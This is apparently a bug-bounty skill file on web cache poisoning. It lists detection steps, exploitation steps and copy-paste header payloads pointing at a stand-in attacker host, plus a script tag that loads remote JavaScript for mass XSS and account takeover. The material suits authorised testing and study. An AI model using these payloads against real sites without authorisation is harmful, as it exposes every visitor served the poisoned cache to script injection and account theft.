# SKILL: Web Cache Poisoning

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (web cache poisoning) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Front-end CDN keys a small set of headers. Anything not in cache key but reflected in response = poisonable.

---

## DETECTION
Burp ParamMiner → Discover cache poisoning. Or manual: send `X-Forwarded-Host: attacker.tld` and check if `<base href>` reflects.

## EXPLOITATION
1. Identify reflected unkeyed header (`X-Forwarded-Host`, `X-Original-URL`, `User-Agent`, `X-Forwarded-Scheme`, `X-Host`, etc.).
2. Inject XSS / open redirect / cache deception payload via that header.
3. Verify `Cache-Control: public` / `X-Cache: HIT` on next request from random IP.
4. Victim hits same URL, gets your poisoned response.

## PAYLOADS (real, copy-paste, grouped)
```http
X-Forwarded-Host: attacker.tld
X-Forwarded-Scheme: http
X-Host: attacker.tld
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

Combined with reflected param (`<script src=//$xfh/x.js>`) → mass XSS to every cache hit.

## BYPASS TECHNIQUES
Use unkeyed parameter / header combinations + delimiter manipulation.

## CHAIN POTENTIAL
Cache poison → mass XSS → mass ATO.

## TOOLS
Param Miner (Burp), Web Cache Vulnerability Scanner

## COMMANDS
Burp → ParamMiner → Discover cache poisoning

## EDGE CASES / NOT-A-BUG TRAPS
Vary headers on response indicate keyed; missing Vary on reflected header = vuln.

## TRIAGE ANGLE (per platform)
Demonstrate the cached version hits a second IP/UA.

## SEVERITY & CVSS
8.5+.

## REFERENCES
PortSwigger Web Cache Poisoning research
